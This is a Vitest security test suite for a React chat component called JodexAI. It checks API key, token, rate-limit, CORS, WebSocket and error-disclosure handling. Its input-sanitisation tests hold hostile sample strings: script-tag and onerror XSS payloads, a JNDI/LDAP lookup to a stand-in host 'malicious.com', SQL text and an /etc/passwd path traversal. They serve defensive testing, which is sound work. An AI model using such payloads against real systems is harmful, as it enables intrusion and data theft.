import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { JodexAI } from '../../JodexAI';
import { createMockFetchResponse, waitFor, flushPromises } from '../setup';

describe('Security Integration Tests', () => {
  let mockFetch: any;

  beforeEach(() => {
    vi.clearAllMocks();
    mockFetch = global.fetch as any;
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Authentication Security', () => {
    it('should handle invalid API key gracefully', async () => {
      mockFetch.mockResolvedValue(
        createMockFetchResponse({ error: 'Invalid API key' }, { ok: false, status: 401 })
      );

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="invalid-key"
          livekitUrl="wss://test.livekit.cloud"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(onError).toHaveBeenCalledWith(
          expect.objectContaining({
            message: expect.stringContaining('Invalid API key'),
          })
        );
      });
    });

    it('should handle missing API key', () => {
      const onError = vi.fn();

      expect(() => {
        render(
          <JodexAI
            apiKey=""
            livekitUrl="wss://test.livekit.cloud"
            onError={onError}
          />
        );
      }).toThrow();
    });

    it('should validate LiveKit URL format', () => {
      const invalidUrls = [
        'not-a-url',
        'http://invalid-without-ssl',
        'ftp://protocol-not-supported',
        '',
      ];

      invalidUrls.forEach(url => {
        expect(() => {
          render(
            <JodexAI
              apiKey="test-key"
              livekitUrl={url}
            />
          );
        }).not.toThrow(); // Component should handle invalid URLs gracefully
      });
    });
  });

  describe('Token Security', () => {
    it('should use server-side token generation when no token provided', async () => {
      mockFetch.mockResolvedValue(
        createMockFetchResponse({
          token: 'mock-jwt-token',
          expiresIn: 3600,
        })
      );

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          // No livekitToken provided - should use server-side generation
        />
      );

      await waitFor(() => {
        expect(mockFetch).toHaveBeenCalledWith(
          '/api/livekit/token',
          expect.objectContaining({
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: expect.stringContaining('roomName'),
          })
        );
      });
    });

    it('should use provided token when available', () => {
      const customToken = 'custom-provided-token';

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          livekitToken={customToken}
        />
      );

      // Should not make fetch call for token generation
      expect(mockFetch).not.toHaveBeenCalledWith('/api/livekit/token', expect.any(Object));
    });

    it('should handle token generation failure', async () => {
      mockFetch.mockResolvedValue(
        createMockFetchResponse(
          { error: 'Token generation failed' },
          { ok: false, status: 500 }
        )
      );

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(onError).toHaveBeenCalled();
      });
    });

    it('should validate token structure', async () => {
      const invalidTokens = [
        'not-a-jwt',
        'invalid.format',
        'too.many.parts.here',
        '',
        null,
        undefined,
      ];

      for (const token of invalidTokens) {
        mockFetch.mockResolvedValue(
          createMockFetchResponse({ token })
        );

        const onError = vi.fn();

        render(
          <JodexAI
            apiKey="test-key"
            livekitUrl="wss://test.livekit.cloud"
            livekitToken={token}
            onError={onError}
          />
        );

        await flushPromises();
        // Component should handle invalid tokens gracefully
        expect(() => screen.getByText(/Jodex/i)).not.toThrow();
      }
    });
  });

  describe('Rate Limiting Security', () => {
    it('should handle rate limiting errors', async () => {
      mockFetch.mockResolvedValue(
        createMockFetchResponse(
          { error: 'Rate limit exceeded', retryAfter: 60 },
          { ok: false, status: 429 }
        )
      );

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(onError).toHaveBeenCalledWith(
          expect.objectContaining({
            message: expect.stringContaining('Rate limit'),
          })
        );
      });
    });

    it('should implement exponential backoff on failures', async () => {
      let callCount = 0;
      mockFetch.mockImplementation(() => {
        callCount++;
        if (callCount <= 2) {
          return Promise.resolve(
            createMockFetchResponse(
              { error: 'Server error' },
              { ok: false, status: 500 }
            )
          );
        }
        return Promise.resolve(
          createMockFetchResponse({ token: 'success-token' })
        );
      });

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
        />
      );

      await waitFor(() => {
        expect(callCount).toBeGreaterThan(2);
      }, { timeout: 5000 });
    });
  });

  describe('Input Validation Security', () => {
    it('should sanitize user input messages', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '${jndi:ldap://malicious.com/a}',
        'SELECT * FROM users',
        '../../../etc/passwd',
      ];

      const mockSend = vi.fn();
      mockFetch.mockResolvedValue(
        createMockFetchResponse({
          choices: [{ message: { content: 'Response' } }],
        })
      );

      for (const input of maliciousInputs) {
        render(
          <JodexAI
            apiKey="test-key"
            livekitUrl="wss://test.livekit.cloud"
          />
        );

        // Find message input and type malicious content
        const inputElement = screen.getByPlaceholderText(/type a message/i);
        fireEvent.change(inputElement, { target: { value: input } });
        fireEvent.click(screen.getByRole('button', { name: /send/i }));

        await flushPromises();
        // Component should handle malicious input without crashing
        expect(() => screen.getByText(input)).not.toThrow();
      }
    });

    it('should limit message length', async () => {
      const longMessage = 'a'.repeat(10000); // Very long message

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          maxMessages={1} // Limit to 1 message
        />
      );

      const inputElement = screen.getByPlaceholderText(/type a message/i);
      fireEvent.change(inputElement, { target: { value: longMessage } });

      // Component should handle long messages gracefully
      expect(inputElement).toBeInTheDocument();
    });

    it('should handle invalid JSON in API responses', async () => {
      mockFetch.mockResolvedValue({
        ok: true,
        json: vi.fn().mockRejectedValue(new Error('Invalid JSON')),
      });

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(onError).toHaveBeenCalled();
      });
    });
  });

  describe('CORS Security', () => {
    it('should handle CORS errors gracefully', async () => {
      mockFetch.mockRejectedValue(new Error('CORS policy violation'));

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(onError).toHaveBeenCalledWith(
          expect.objectContaining({
            message: expect.stringContaining('CORS'),
          })
        );
      });
    });

    it('should validate request headers', async () => {
      mockFetch.mockResolvedValue(
        createMockFetchResponse({ token: 'test-token' })
      );

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
        />
      );

      await waitFor(() => {
        expect(mockFetch).toHaveBeenCalledWith(
          '/api/livekit/token',
          expect.objectContaining({
            headers: expect.objectContaining({
              'Content-Type': 'application/json',
            }),
          })
        );
      });
    });
  });

  describe('WebSocket Security', () => {
    it('should handle WebSocket connection failures', async () => {
      // Mock WebSocket to simulate connection failure
      const mockWebSocket = vi.fn().mockImplementation(() => {
        const ws = {
          addEventListener: vi.fn(),
          removeEventListener: vi.fn(),
          send: vi.fn(),
          close: vi.fn(),
          readyState: 3, // WebSocket.CLOSED
        };

        // Simulate immediate connection failure
        setTimeout(() => {
          const errorEvent = new Event('error');
          ws.addEventListener.mock.calls
            .find(([event]) => event === 'error')?.[1](errorEvent);
        }, 10);

        return ws;
      });

      global.WebSocket = mockWebSocket;

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://invalid-url"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(mockWebSocket).toHaveBeenCalled();
      }, { timeout: 1000 });
    });

    it('should validate WebSocket URL protocols', async () => {
      const invalidProtocols = [
        'http://not-secure.com',
        'ftp://protocol.com',
        'ws://insecure.com', // Non-HTTPS WebSocket
      ];

      for (const url of invalidProtocols) {
        render(
          <JodexAI
            apiKey="test-key"
            livekitUrl={url}
          />
        );

        // Component should handle invalid protocols gracefully
        expect(() => screen.getByText(/Jodex/i)).not.toThrow();
      }
    });
  });

  describe('Content Security Policy', () => {
    it('should not use unsafe JavaScript practices', async () => {
      const mockSend = vi.fn();
      mockFetch.mockResolvedValue(
        createMockFetchResponse({
          choices: [{ message: { content: 'Safe response' } }],
        })
      );

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
        />
      );

      // Verify that no script tags are injected
      const scripts = document.querySelectorAll('script');
      const jodexScripts = Array.from(scripts).filter(script =>
        script.textContent?.includes('jodex') || script.id?.includes('jodex')
      );

      expect(jodexScripts).toHaveLength(0);
    });

    it('should sanitize dynamic content', async () => {
      const maliciousContent = '<img src="x" onerror="alert(\'xss\')">';
      mockFetch.mockResolvedValue(
        createMockFetchResponse({
          choices: [{ message: { content: maliciousContent } }],
        })
      );

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
        />
      );

      // Wait for message to appear
      await waitFor(() => {
        expect(screen.getByText(/x/i)).toBeInTheDocument();
      });

      // Verify that image elements are not created from malicious content
      const images = document.querySelectorAll('img[onerror]');
      expect(images).toHaveLength(0);
    });
  });

  describe('Memory Security', () => {
    it('should limit stored data size', async () => {
      const mockLocalStorage = {
        data: {},
        getItem: vi.fn((key) => mockLocalStorage.data[key] || null),
        setItem: vi.fn((key, value) => {
          // Simulate storage size limit
          if (value.length > 10000) {
            throw new Error('Storage quota exceeded');
          }
          mockLocalStorage.data[key] = value;
        }),
        removeItem: vi.fn((key) => delete mockLocalStorage.data[key]),
        clear: vi.fn(() => mockLocalStorage.data = {}),
      };

      Object.defineProperty(window, 'localStorage', {
        value: mockLocalStorage,
        writable: true,
      });

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          maxMessages={1000} // Large number to test storage limits
          onError={onError}
        />
      );

      // Generate many messages to test storage limits
      const inputElement = screen.getByPlaceholderText(/type a message/i);
      for (let i = 0; i < 100; i++) {
        fireEvent.change(inputElement, {
          target: { value: `Message ${i}`.repeat(100) } // Large message
        });
        fireEvent.click(screen.getByRole('button', { name: /send/i }));
        await flushPromises();
      }

      // Component should handle storage limits gracefully
      expect(() => screen.getByText(/Message/i)).not.toThrow();
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not expose sensitive information in errors', async () => {
      mockFetch.mockRejectedValue({
        message: 'Database connection failed: host=db.internal.com port=5432 user=admin password=secret',
        stack: 'Error: ...',
      });

      const onError = vi.fn();

      render(
        <JodexAI
          apiKey="test-key"
          livekitUrl="wss://test.livekit.cloud"
          onError={onError}
        />
      );

      await waitFor(() => {
        expect(onError).toHaveBeenCalled();
        const error = onError.mock.calls[0][0];

        // Error should not contain sensitive information
        expect(error.message).not.toContain('password');
        expect(error.message).not.toContain('admin');
        expect(error.message).not.toContain('db.internal.com');
      });
    });
  });
});